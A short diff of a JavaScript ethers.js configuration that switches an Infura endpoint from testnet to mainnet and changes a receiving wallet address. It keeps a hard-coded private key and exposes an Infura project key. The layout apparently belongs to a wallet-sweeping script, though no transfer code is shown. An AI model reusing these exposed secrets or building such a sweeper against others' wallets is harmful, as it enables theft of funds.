@@ -1,12 +1,12 @@
 const { ethers } = require('ethers')
 
-const provider = new ethers.providers.JsonRpcProvider('https://sepolia.infura.io/v3/e54a286f7ec04607b570c19c804dc6a8')
+const provider = new ethers.providers.JsonRpcProvider('https://mainnet.infura.io/v3/e54a286f7ec04607b570c19c804dc6a8')
 
 
 
 
 
-const addressReceiver = '0x26D4696bCCd77f7822b8848c5912B4096eC9a739'
+const addressReceiver = '0x65461E584BB8c9E47325EABBE9b811ba4E95F500'
 
 const privateKeys = ["91ec42ba989500ecf32e6ad8066af193b266dc776a23500131dfb91f1c1270b2"]
 
